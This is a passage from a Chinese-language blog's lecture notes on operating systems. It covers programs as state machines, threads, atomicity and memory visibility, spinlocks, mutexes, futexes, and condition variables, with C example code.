(&#123; top--; &#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hanoi</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">char</span> from, <span class="keyword">char</span> to, <span class="keyword">char</span> via)</span> </span>&#123;</span><br><span class="line">  Frame stk[<span class="number">64</span>], *top = stk - <span class="number">1</span>;</span><br><span class="line">  call(n, from, to, via);</span><br><span class="line">  <span class="keyword">for</span> (Frame *f; (f = top) &gt;= stk; f-&gt;pc++) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (f-&gt;pc) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>: <span class="keyword">if</span> (f-&gt;n == <span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;%c -&gt; %c\n&quot;</span>, f-&gt;from, f-&gt;to), f-&gt;pc = <span class="number">3</span>; <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>: call(f-&gt;n - <span class="number">1</span>, f-&gt;from, f-&gt;via, f-&gt;to);   <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>: call(       <span class="number">1</span>, f-&gt;from, f-&gt;to,  f-&gt;via);  <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>: call(f-&gt;n - <span class="number">1</span>, f-&gt;via,  f-&gt;to,  f-&gt;from); <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>: ret();                                    <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>: panic();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>二进制程序是状态机</h1><ul><li>状态 = 内存  + 寄存器</li><li>初始状态 = (稍后回答)</li><li>迁移 = 执行一条指令</li></ul><h2 id="操作系统上的程序"><a class="header-anchor" href="#操作系统上的程序">¶</a>操作系统上的程序</h2><p><strong>所有的指令都只能计算</strong></p><ul><li>deterministic: mov, add, sub, call, …</li><li>non-deterministic: rdrand, …</li><li>但这些指令甚至都无法使程序停下来</li></ul><h2 id="特殊指令：syscall"><a class="header-anchor" href="#特殊指令：syscall">¶</a>特殊指令：syscall</h2><ul><li><p>把内存M、寄存器R完全交给操作系统，任其修改</p></li><li><p>实现与操作系统中的其他对象交互</p><ul><li>读写文件/操作系统状态 (例如把文件内容写入M )</li><li>改变进程 (运行中状态机) 的状态，例如创建进程/销毁自己</li></ul></li></ul><h2 id="程序-计算-syscall"><a class="header-anchor" href="#程序-计算-syscall">¶</a>程序 = 计算 + syscall</h2><h1>在程序的两个视角之间切换</h1><p>“状态机” 顺便解决了一个非常重要的基本问题：什么是编译器？</p><p>编译器：源代码S (状态机) → 二进制代码C (状态机)</p><p>编译 (优化) 的正确性 (Soundness):</p><ul><li>S与C的可观测行为严格一致<ul><li>system calls; volatile variable loads/stores; termination</li></ul></li><li>Trivially 正确 (但低效) 的实现<ul><li>解释执行/直接翻译S的语义</li></ul></li></ul><h1>操作系统中的一般程序</h1><p>操作系统收编了所有的硬件/软件资源</p><ul><li>只能用操作系统允许的方式访问操作系统中的对象<ul><li>从而实现操作系统的 “霸主” 地位</li></ul></li><li>这是为 “管理多个状态机” 所必须的<ul><li>不能打架，谁有权限就给他</li></ul></li></ul><h2 id="二进制程序状态机的初始-结束状态"><a class="header-anchor" href="#二进制程序状态机的初始-结束状态">¶</a>二进制程序状态机的初始/结束状态</h2><ul><li><code>main()</code> 的开始/结束并不是整个程序的开始/结束</li></ul><p>gdb <code>info proc &#123;mappings,...&#125;</code> - 打印进程内存</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jyyOS-2</title>
      <link href="/2022/09/08/jyyOS-2/"/>
      <url>/2022/09/08/jyyOS-2/</url>
      
        <content type="html"><![CDATA[<h2 id="并发的基本单位：线程"><a class="header-anchor" href="#并发的基本单位：线程">¶</a>并发的基本单位：线程</h2><p>共享内存的多个执行流</p><ul><li>执行流拥有独立的堆栈/寄存器</li><li>共享全部的内存 (指针可以互相引用)</li></ul><h1>入门：<code>thread.h</code> 简化的线程 API</h1><ul><li><code>create(fn)</code><ul><li>创建一个入口函数是 <code>fn</code> 的线程，并立即开始执行<ul><li><code>void fn(int tid) &#123; ... &#125;</code></li><li>参数 <code>tid</code> 从 1 开始编号</li></ul></li><li>语义：在状态中新增 stack frame 列表并初始化为 <code>fn(tid)</code></li></ul></li><li><code>join()</code><ul><li>等待所有运行线程的 <code>fn</code> 返回</li><li>在 <code>main</code> 返回时会自动等待所有线程结束</li><li>语义：在有其他线程未执行完时死循环，否则返回</li></ul></li><li>编译时需要增加 <code>-lpthread</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdatomic.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTHREAD 64</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> T_FREE = <span class="number">0</span>, T_LIVE, T_DEAD, &#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> id, status;</span><br><span class="line">  <span class="keyword">pthread_t</span> thread;</span><br><span class="line">  <span class="keyword">void</span> (*entry)(<span class="keyword">int</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread</span> <span class="title">tpool</span>[<span class="title">NTHREAD</span>], *<span class="title">tptr</span> =</span> tpool;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">wrapper</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">thread</span> =</span> (struct thread *)arg;</span><br><span class="line">  thread-&gt;entry(thread-&gt;id);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(<span class="keyword">void</span> *fn)</span> </span>&#123;</span><br><span class="line">  assert(tptr - tpool &lt; NTHREAD);</span><br><span class="line">  *tptr = (struct thread) &#123;</span><br><span class="line">    .id = tptr - tpool + <span class="number">1</span>,</span><br><span class="line">    .status = T_LIVE,</span><br><span class="line">    .entry = fn,</span><br><span class="line">  &#125;;</span><br><span class="line">  pthread_create(&amp;(tptr-&gt;thread), <span class="literal">NULL</span>, wrapper, tptr);</span><br><span class="line">  ++tptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">join</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NTHREAD; i++) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">t</span> =</span> &amp;tpool[i];</span><br><span class="line">    <span class="keyword">if</span> (t-&gt;status == T_LIVE) &#123;</span><br><span class="line">      pthread_join(t-&gt;thread, <span class="literal">NULL</span>);</span><br><span class="line">      t-&gt;status = T_DEAD;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((destructor)) <span class="function"><span class="keyword">void</span> <span class="title">cleanup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  join();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>放弃</h1><h2 id="1-原子性"><a class="header-anchor" href="#1-原子性">¶</a>1. 原子性</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100000000</span></span><br><span class="line"><span class="keyword">long</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tsum</span><span class="params">()</span> </span>&#123; <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) sum++; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  create(Tsum);</span><br><span class="line">  create(Tsum);</span><br><span class="line">  join();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;sum = %ld\n&quot;</span>, sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>“程序 (甚至是一条指令) 独占处理器执行” 的基本假设在现代多处理器系统上不再成立。</strong></p><p>原子性：一段代码执行 (例如 <code>pay()</code>) 独占整个计算机系统</p><ul><li>单处理器多线程<ul><li>线程在运行时可能被中断，切换到另一个线程执行</li></ul></li><li>多处理器多线程<ul><li>线程根本就是并行执行的</li></ul></li></ul><h2 id="2-顺序"><a class="header-anchor" href="#2-顺序">¶</a>2. 顺序</h2><p>给sum添加编译优化？</p><ul><li><code>-O1</code>: 100000000 😱😱</li><li><code>-O2</code>: 200000000 😱😱😱</li></ul><p>不同编译优化对并发的处理不同，O1可能是分别写入各自求和的结果</p><p><strong>编译器对内存访问 “eventually consistent” 的处理导致共享内存作为线程同步工具的失效。</strong></p><h2 id="3-可见性"><a class="header-anchor" href="#3-可见性">¶</a>3. 可见性</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">T1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  x = <span class="number">1</span>;</span><br><span class="line">  <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;&quot;</span> : : <span class="string">&quot;memory&quot;</span>)</span></span>; <span class="comment">// compiler barrier</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;y = %d\n&quot;</span>, y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">T2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  y = <span class="number">1</span>;</span><br><span class="line">  <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;&quot;</span> : : <span class="string">&quot;memory&quot;</span>)</span></span>; <span class="comment">// compiler barrier</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;x = %d\n&quot;</span>, x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Tip：输出不好读？pipe to head -n 1000000 | sort | uniq -c</span></span><br></pre></td></tr></table></figure><p>出现了状态机推理之外的结果：0 0</p><p>现代处理器也是（动态）编译器，把汇编变为微指令μops，每个μop都有Fetch, Issue, Execute, Commit 四个阶段。</p><p><strong>满足单处理器 eventual memory consistency 的执行，在多处理器上可能无法序列化！</strong></p><p>导致可见性的丧失</p><h1>互斥</h1><h2 id="一个互斥算法——Peterson-算法"><a class="header-anchor" href="#一个互斥算法——Peterson-算法">¶</a>一个互斥算法——Peterson 算法</h2><p>互斥：保证两个线程不能同时执行一段代码。</p><h3 id="举例"><a class="header-anchor" href="#举例">¶</a>举例</h3><p>A 和 B 争用厕所的包厢</p><ol><li><p>想进入包厢之前，A/B 都要先举起自己的旗子</p></li><li><p>A 确认旗子举好以后，往厕所门上贴上 “B 正在使用” 的标签</p><p>B 确认旗子举好以后，往厕所门上贴上 “A 正在使用” 的标签</p></li><li><p>然后，如果对方的旗子举起来，且门上的名字不是自己，等待</p><p>否则可以进入包厢</p></li><li><p>出包厢后，放下自己的旗子</p></li></ol><ul><li>如果只有一个人举旗，他就可以直接进入</li><li>如果两个人同时举旗，由厕所门上的标签决定谁进<ul><li>手快有 (被另一个人的标签覆盖)、手慢无</li></ul></li></ul><h2 id="硬件提供原子指令"><a class="header-anchor" href="#硬件提供原子指令">¶</a>硬件提供原子指令</h2><p>例：Atomic exchange (load + store)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">xchg</span><span class="params">(<span class="keyword">volatile</span> <span class="keyword">int</span> *addr, <span class="keyword">int</span> newval)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result;</span><br><span class="line">  <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(<span class="string">&quot;lock xchg %0, %1&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    : <span class="string">&quot;+m&quot;</span>(*addr), <span class="string">&quot;=a&quot;</span>(result) : <span class="string">&quot;1&quot;</span>(newval))</span></span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原子指令的模型</p><ul><li>保证之前的 store 都写入内存</li><li>保证 load/store 不与原子指令乱序</li></ul><h2 id="自旋锁"><a class="header-anchor" href="#自旋锁">¶</a>自旋锁</h2><h3 id="用-xchg-实现互斥"><a class="header-anchor" href="#用-xchg-实现互斥">¶</a>用 <code>xchg</code> 实现互斥</h3><p>如何协调宿舍若干位同学上厕所问题？</p><ul><li>在厕所门口放一个桌子 (共享变量)<ul><li>初始时，桌上是 🔑</li></ul></li><li>每个人可以完成原子操作<ul><li>拿一个任意东西与🔑交换（xchg）</li></ul></li></ul><p>实现互斥的协议</p><ul><li>想上厕所的同学 (一条 xchg 指令)<ul><li>天黑请闭眼</li><li>试图知道桌子上有什么 (🔑 或 🔞)</li><li>把 🔞 放到桌上 (覆盖之前有的任何东西)</li><li>天亮请睁眼；看到 🔑 才可以进厕所哦</li></ul></li><li>出厕所的同学<ul><li>把 🔑 放到桌上</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> table = YES;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">retry:</span><br><span class="line">  <span class="keyword">int</span> got = xchg(&amp;table, NOPE);</span><br><span class="line">  <span class="keyword">if</span> (got == NOPE)</span><br><span class="line">    <span class="keyword">goto</span> retry;</span><br><span class="line">  assert(got == YES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  xchg(&amp;table, YES)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 简洁版</span></span><br><span class="line"><span class="keyword">int</span> locked = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span> </span>&#123; <span class="keyword">while</span> (xchg(&amp;locked, <span class="number">1</span>)) ; &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlock</span><span class="params">()</span> </span>&#123; xchg(&amp;locked, <span class="number">0</span>); &#125;</span><br></pre></td></tr></table></figure><h3 id="Load-Reserved-Store-Conditional-LR-SC"><a class="header-anchor" href="#Load-Reserved-Store-Conditional-LR-SC">¶</a>Load-Reserved/Store-Conditional (LR/SC)</h3><p>LR: 在内存上标记 reserved (盯上你了)，中断、其他处理器写入都会导致标记消除</p><p>SC: 如果 “盯上” 未被解除，则写入</p><h3 id="自旋锁的缺陷"><a class="header-anchor" href="#自旋锁的缺陷">¶</a>自旋锁的缺陷</h3><p>因为自旋锁的存在使得临界区的代码只能被串行执行，拿不到所的线程只能在CPU上空转，所以程序的性能受到了不小的影响，因此自旋锁一般用于管理比较短的临界区</p><p>即：</p><ol><li><p>自旋 (共享变量) 会触发处理器间的缓存同步，延迟增加</p></li><li><ul><li>除了进入临界区的线程，其他处理器上的线程都在空转</li><li>争抢锁的处理器越多，利用率越低</li></ul></li><li><p>获得自旋锁的线程可能被操作系统切换出去，100%资源浪费</p></li></ol><h3 id="自旋锁的使用场景"><a class="header-anchor" href="#自旋锁的使用场景">¶</a>自旋锁的使用场景</h3><ul><li>临界区几乎不 “拥堵”</li><li>持有自旋锁时禁止执行流切换</li></ul><p>使用场景：操作系统内核的并发数据结构 (短临界区)</p><h2 id="mutex（互斥锁-睡眠锁）"><a class="header-anchor" href="#mutex（互斥锁-睡眠锁）">¶</a>mutex（互斥锁/睡眠锁）</h2><p>因此，我们要改进自旋锁的性能，从“程序就是状态机”的视角来看，拿不到自旋锁的线程所对应的状态机只会不可避免的一遍一遍地执行<code>xchg</code>指令，那我们不妨想办法修改它的状态机，让它在第一次尝试获得锁失败后就立刻执行<code>syscall</code>指令，陷入内核，让拥有高特权级的操作系统内核把其他线程换上CPU运行，就好像这个线程已经用完了它的时间片。这样的话，既不会改变状态机原有的状态，也把CPU资源留给了有用的计算。</p><ul><li><code>syscall(SYSCALL_lock, &amp;lk);</code><ul><li>试图获得 <code>lk</code>，但如果失败，就切换到其他线程</li></ul></li><li><code>syscall(SYSCALL_unlock, &amp;lk);</code><ul><li>释放 <code>lk</code>，如果有等待锁的线程就唤醒</li></ul></li></ul><p>举例：操作系统 = 更衣室管理员</p><ul><li>先到的人 (线程)<ul><li>成功获得手环，进入游泳馆</li><li><code>*lk = 🔒</code>，系统调用直接返回</li></ul></li><li>后到的人 (线程)<ul><li>不能进入游泳馆，排队等待</li><li>线程放入等待队列，执行线程切换 (yield)</li></ul></li><li>洗完澡出来的人 (线程)<ul><li>交还手环给管理员；管理员把手环再交给排队的人</li><li>如果等待队列不空，从等待队列中取出一个线程允许执行</li><li>如果等待队列为空，<code>*lk = ✅</code></li></ul></li><li>管理员 (OS) 使用自旋锁确保自己处理手环的过程是原子的</li></ul><h2 id="自旋锁·睡眠锁分析"><a class="header-anchor" href="#自旋锁·睡眠锁分析">¶</a>自旋锁·睡眠锁分析</h2><p>自旋锁 (线程直接共享 locked)</p><ul><li>更快的 fast path<ul><li>xchg 成功 → 立即进入临界区，开销很小</li></ul></li><li>更慢的 slow path<ul><li>xchg 失败 → 浪费 CPU 自旋等待</li></ul></li></ul><p>在多处理器情况下，没有对锁的争用，也就是只有一个线程想获得锁，那么明显自旋锁更快，通过一条<code>xchg</code>原子指令就能获得/释放锁；如果出现了锁的争用，拥堵的越严重，自旋锁的性能就越差。</p><hr><p>睡眠锁 (通过系统调用访问 locked)</p><ul><li>更快的 slow path<ul><li>上锁失败线程不再占用 CPU</li></ul></li><li>更慢的 fast path<ul><li>即便上锁成功也需要进出内核 (syscall)</li><li>系统调用涉及到特权级的切换，页表的切换，栈指针的切换，etc. 系统调用这件事本身的开销就不小</li></ul></li></ul><h2 id="Futex-Fast-Userspace-muTexes"><a class="header-anchor" href="#Futex-Fast-Userspace-muTexes">¶</a>Futex: Fast Userspace muTexes</h2><ul><li>Fast path: 一条原子指令，上锁成功立即返回</li><li>Slow path: 上锁失败，执行系统调用睡眠</li></ul><h1>同步</h1><p>线程同步：在某个时间点共同达到互相已知的状态</p><h2 id="生产者-消费者问题"><a class="header-anchor" href="#生产者-消费者问题">¶</a>生产者-消费者问题</h2><p>并发软件开发场景中，有相当大一部分的并发问题本质上就是生产者-消费者问题。</p><p>概述如下：有一个buffer，它的大小是固定的，此时系统中有两种类型的线程；</p><ul><li>生产者（producer），往buffer里丢东西</li><li>消费者（consumer），从buffer里取东西</li></ul><p>因为buffer有大小限制，所以不能往里面丢太多东西，因此生产者在buffer满的时候就不能向其中再填入数据了，需要开始等待；当buffer空的时候，消费者也自然不会消费，因此也需要开始等待。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tproduce</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">retry:</span><br><span class="line">    mutex_lock(&amp;lk);</span><br><span class="line">    <span class="keyword">if</span> (count == n) &#123;</span><br><span class="line">      mutex_unlock(&amp;lk);</span><br><span class="line">      <span class="keyword">goto</span> retry;</span><br><span class="line">    &#125;</span><br><span class="line">    count++;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(&quot;</span>);</span><br><span class="line">    mutex_unlock(&amp;lk);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tconsume</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">retry:</span><br><span class="line">    mutex_lock(&amp;lk);</span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span>) &#123;</span><br><span class="line">      mutex_unlock(&amp;lk);</span><br><span class="line">      <span class="keyword">goto</span> retry;</span><br><span class="line">    &#125;</span><br><span class="line">    count--;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;)&quot;</span>);</span><br><span class="line">    mutex_unlock(&amp;lk);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用互斥锁保持条件成立，但它还是有一个自旋的循环，尽管<code>lock</code>中不一定spin，但while循环做的事情就是spin，可以说是&quot;spin on the buffer&quot;</p><h2 id="条件变量：万能同步方法"><a class="header-anchor" href="#条件变量：万能同步方法">¶</a>条件变量：万能同步方法</h2><p>条件变量的设计，其实就是“锁+条件”</p><p>把上文代码中的自旋变成睡眠，在完成操作时唤醒</p><h3 id="条件变量-API"><a class="header-anchor" href="#条件变量-API">¶</a>条件变量 API</h3><ul><li><p>wait(cv, mutex) 💤</p><ul><li>调用时必须保证已经获得 mutex</li><li>释放 mutex、进入睡眠状态</li></ul><hr><p><code>wait(fn)</code>这种，该api会一直监控<code>fn</code>，频繁地调用它，看它满足不满足条件，其内部实现可以是<code>while(!fn());</code>这样，所以看起来我们就可以保证“<code>wait</code>返回之后，<code>fn</code>对应的条件就成立了”。</p><p>实则不然，这只能保证<code>fn</code>被调用的时候条件成立，但系统是并发的（可能有好几百个生产者/消费者），<code>fn</code>返回的时候也许条件就不再成立了，因此api不能这样设计。</p><p>我们希望的是<code>wait</code>返回之后，相应的条件会在一段时间里持续地被满足，因此可以借助锁使得条件持续地被满足。<strong>条件变量的设计，其实就是“锁+条件”</strong></p><p>因此，<code>wait</code>函数内部要做的事情就是：当发现条件不满足时进入睡眠，并且释放锁，等到条件满足时线程被唤醒，并且再次获得锁，从而在保持条件一直被满足，直到锁被释放。</p><hr></li><li><p>signal/notify(cv) 💬 私信：走起</p><ul><li>如果有线程正在等待 cv，则唤醒其中一个线程</li></ul></li><li><p>broadcast/notifyAll(cv) 📣 所有人：走起</p><ul><li>唤醒全部正在等待 cv 的线程</li></ul></li></ul><p>具体的代码框架如下，<code>cond</code>是我们要等待的条件。如果我们知道每个线程在等什么，并且能够知道其他的线程在什么时候可以让这个线程所等待的事情成立，就可以套用如下的框架去解决同步问题</p><ul><li><p>需要等待条件满足时</p><p><code>mutex_lock(&amp;mutex); while (!cond) &#123;   wait(&amp;cv, &amp;mutex); &#125; assert(cond); // ... // 互斥锁保证了在此期间条件 cond 总是成立 // ... mutex_unlock(&amp;mutex);</code></p></li><li><p>其他线程条件可能被满足时</p><p><code>broadcast(&amp;cv);</code></p></li></ul><h3 id="习题"><a class="header-anchor" href="#习题">¶</a>习题</h3><p>有三种线程，分别打印 <code>&lt;</code>, <code>&gt;</code>, 和 <code>_</code></p><ul><li>对这些线程进行同步，使得打印出的序列总是 <code>&lt;&gt;&lt;_</code> 和 <code>&gt;&lt;&gt;_</code> 组合</li></ul><hr><p>使用条件变量，实现多个打印线程之间的同步，那么就需要分析出：每个线程得以继续向前执行时需要满足什么条件？</p><p>也就是只要回答三个问题：</p><ul><li>打印 “<code>&lt;</code>” 的条件？</li><li>打印 “<code>&gt;</code>” 的条件？</li><li>打印 “<code>_</code>” 的条件？</li></ul><p>给我们期望中的系统构建一个状态机</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/20220912192044.png" alt></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">state</span> &#123;</span></span><br><span class="line">  A = <span class="number">1</span>, B, C, D, E, F,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rule</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> 